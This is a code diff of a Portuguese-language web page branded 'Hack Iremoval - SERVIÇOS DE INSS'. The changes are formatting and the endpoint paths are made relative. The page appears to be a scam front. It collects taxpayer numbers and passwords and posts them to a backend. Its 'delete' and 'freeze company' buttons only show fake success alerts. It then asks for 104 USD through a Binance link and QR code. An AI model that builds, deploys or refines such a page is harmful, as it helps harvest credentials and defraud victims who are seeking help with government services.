@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Hack Iremoval - SERVIÇOS DE INSS</title>
   <style>
     body {
@@ -85,9 +85,9 @@
   <div class="login-container" id="loginPanel">
     <h1>Hack Iremoval</h1>
     <h2>SERVIÇOS DE INSS</h2>
-    <input type="text" id="contribuinte" placeholder="Contribuinte">
-    <input type="password" id="senha" placeholder="Senha">
-    <br>
+    <input type="text" id="contribuinte" placeholder="Contribuinte" />
+    <input type="password" id="senha" placeholder="Senha" />
+    <br />
     <button class="btn" onclick="fazerLogin()">Entrar</button>
   </div>
 
@@ -111,9 +111,9 @@
       <p><strong>Conta:</strong> BINANCE - <a href="https://s.binance.com/xk5ApxW9" target="_blank">https://s.binance.com/xk5ApxW9</a></p>
       <p><strong>Valor:</strong> 104 USD</p>
       <div class="qr-code">
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://s.binance.com/xk5ApxW9" alt="QR Code">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=https://s.binance.com/xk5ApxW9" alt="QR Code" />
       </div>
-      <br>
+      <br />
       <button class="btn" onclick="baixarPDF()">Baixar Comprovativo (PDF)</button>
     </div>
   </div>
@@ -122,38 +122,44 @@
     let dadosEmpresa = {};
 
     function fazerLogin() {
-      const user = document.getElementById("contribuinte").value;
-      const pass = document.getElementById("senha").value;
+      const user = document.getElementById('contribuinte').value;
+      const pass = document.getElementById('senha').value;
 
-      fetch('http://localhost:3000/api/login', {
+      fetch('/api/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ contribuinte: user, senha: pass })
+        body: JSON.stringify({ contribuinte: user, senha: pass }),
       })
-      .then(res => res.json())
-      .then(data => {
-        if (data.sucesso) {
-          dadosEmpresa = data.dados;
-          document.getElementById("c1").innerText = dadosEmpresa.contribuinte;
-          document.getElementById("c2").innerText = dadosEmpresa.nome;
-          document.getElementById("c3").innerText = dadosEmpresa.actividade;
-          document.getElementById("loginPanel").classList.add("hidden");
-          document.getElementById("mainPanel").classList.remove("hidden");
-        } else {
-          alert("Credenciais inválidas.");
-        }
-      })
-      .catch(() => alert("Erro ao conectar com servidor."));
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.sucesso) {
+            dadosEmpresa = data.dados;
+            document.getElementById('c1').innerText = dadosEmpresa.contribuinte;
+            document.getElementById('c2').innerText = dadosEmpresa.nome;
+            document.getElementById('c3').innerText = dadosEmpresa.actividade;
+            document.getElementById('loginPanel').classList.add('hidden');
+            document.getElementById('mainPanel').classList.remove('hidden');
+          } else {
+            alert('Credenciais inválidas.');
+          }
+        })
+        .catch(() => alert('Erro ao conectar com servidor.'));
     }
 
-    function eliminar() { alert("Empresa eliminada com sucesso."); }
-    function alterar() { alert("Funcionalidade de alteração de dados em desenvolvimento."); }
-    function congelar() { alert("Empresa marcada como FROZEN."); }
+    function eliminar() {
+      alert('Empresa eliminada com sucesso.');
+    }
+    function alterar() {
+      alert('Funcionalidade de alteração de dados em desenvolvimento.');
+    }
+    function congelar() {
+      alert('Empresa marcada como FROZEN.');
+    }
     function mostrarPagamento() {
-      document.getElementById("pagamento").classList.remove("hidden");
+      document.getElementById('pagamento').classList.remove('hidden');
     }
     function baixarPDF() {
-      window.open('http://localhost:3000/api/gerar-pdf', '_blank');
+      window.open('/api/gerar-pdf', '_blank');
     }
   </script>
 </body>
